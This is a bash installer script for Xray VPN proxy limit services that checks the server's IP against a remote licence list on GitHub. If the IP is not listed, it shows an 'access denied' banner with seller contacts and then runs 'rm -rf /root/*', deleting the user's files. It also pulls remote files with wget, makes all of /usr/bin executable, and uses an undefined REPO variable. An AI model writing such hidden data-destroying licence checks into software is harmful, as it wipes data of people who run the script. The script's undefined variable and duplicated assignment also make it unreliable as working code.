#!/bin/bash
MYIP=$(cat /usr/bin/.ipvps)
IZIN_FILE="/root/izin/ip"
IZIN=$(curl -sL "https://raw.githubusercontent.com/nameless-newbie/fifth-sc/main/izin/ip")
IZIN="https://raw.githubusercontent.com/nameless-newbie/fifth-sc/main/izin/ip"
ALLOWED_IP=$(curl -sL "$IZIN" | grep "$MYIP" | awk '{print $4}')
if [[ "$MYIP" != "$ALLOWED_IP" ]]; then
echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
echo -e "\033[41;1m ⚠️       ACCESS DENIED         ⚠️ \033[0m"
echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
echo -e ""
echo -e "        \033[91;1m❌ SCRIPT LOCKED ❌\033[0m"
echo -e ""
echo -e "  \033[0;33m🔒 Your VPS\033[0m $MYIP \033[0;33mHas been Banned\033[0m"
echo -e ""
echo -e "  \033[91m⚠️  Active Period Has Expired ⚠️\033[0m"
echo -e "  \033[0;33m💡 Purchase official licenses only from the Admin!\033[0m"
echo -e ""
echo -e "  \033[92;1m📞 Contact Admin:\033[0m"
echo -e "  \033[96m🌍 Telegram: https://t.me/kuzavpn\033[0m"
echo -e "  \033[96m📱 WhatsApp: https://wa.me/628971173434\033[0m"
echo -e ""
echo -e "\033[1;93m────────────────────────────────────────────\033[0m"

    # Hapus semua file di /root dan keluar
    rm -rf /root/*
    exit 1
fi
wget -q -O /usr/bin/limit-ip "${REPO}install/limit-ip"
chmod +x /usr/bin/*
cd /usr/bin
sed -i 's/\r//' limit-ip
cd
systemctl daemon-reload
wget -q -O /etc/systemd/system/limitvmess.service "${REPO}install/limitvmess.service" && chmod +x limitvmess.service >/dev/null 2>&1
wget -q -O /etc/systemd/system/limitvless.service "${REPO}install/limitvless.service" && chmod +x limitvless.service >/dev/null 2>&1
wget -q -O /etc/systemd/system/limittrojan.service "${REPO}install/limittrojan.service" && chmod +x limittrojan.service >/dev/null 2>&1
wget -q -O /etc/systemd/system/limitshadowsocks.service "${REPO}install/limitshadowsocks.service" && chmod +x limitshadowsocks.service >/dev/null 2>&1
wget -q -O /etc/xray/limit.vmess "${REPO}install/vmess" >/dev/null 2>&1
wget -q -O /etc/xray/limit.vless "${REPO}install/vless" >/dev/null 2>&1
wget -q -O /etc/xray/limit.trojan "${REPO}install/trojan" >/dev/null 2>&1
wget -q -O /etc/xray/limit.shadowsocks "${REPO}install/shadowsocks" >/dev/null 2>&1
chmod +x /etc/xray/limit.vmess
chmod +x /etc/xray/limit.vless
chmod +x /etc/xray/limit.trojan
chmod +x /etc/xray/limit.shadowsocks
systemctl daemon-reload
systemctl enable --now limitvmess
systemctl enable --now limitvless
systemctl enable --now limittrojan
systemctl enable --now limitshadowsocks
systemctl start limitvmess
systemctl start limitvless
systemctl start limittrojan
systemctl start limitshadowsocks